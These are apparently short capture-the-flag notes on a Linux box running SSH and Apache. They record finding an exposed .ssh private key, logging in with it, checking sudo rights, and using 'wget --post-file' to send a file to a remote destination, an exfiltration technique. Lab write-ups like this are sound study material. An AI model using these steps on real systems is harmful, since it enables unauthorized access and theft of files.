# Machine Information
### Open port
	22/tcp: SSH
	80/tcp: Apache 2.4.18
### OS: Linux

# Reconnaissance
	- Found sitemap endpoint.
	- Get jessie as name of a employee.
	- Got .ssh folder, where contain a ssh private key.

# What I learn from
1. Get permission of user in session
```bash
sudo -l
```
2. Connect SSH using private key
```bash
# Set permission for SSH private key (Optional)
sudo chmod 700 ssh_key_file_name
# Connect SSH
ssh -i ssh_key_file_name user@host
```
3. Using wget command to send file
```bash
wget --post-file file_name destination
```